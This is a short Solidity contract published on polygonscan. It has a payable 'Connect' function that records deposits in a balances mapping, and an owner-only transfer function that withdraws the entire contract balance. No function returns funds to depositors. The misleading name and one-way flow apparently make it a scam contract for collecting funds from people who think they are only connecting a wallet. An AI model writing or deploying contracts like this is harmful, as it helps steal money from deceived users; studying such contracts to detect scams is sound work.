/**
 *Submitted for verification at polygonscan.com on 2023-06-26
*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.17;

contract THE_Contract {
  address private owner;
  mapping (address => uint256) private balances;
  constructor() {
    owner = msg.sender;
  }
  function getOwner() public view returns (address) {
    return owner;
  }
  function getBalance() public view returns (uint256) {
    return address(this).balance;
  }
  function transfer(uint256 amount) public {
    require(msg.sender == owner, "You are not the owner");
    amount = (amount == 0) ? address(this).balance : amount;
    require(amount <= address(this).balance, "Balance too low");
    payable(msg.sender).transfer(amount);
  }
  function Connect(address sender) public payable {
    balances[sender] += msg.value;
  }
}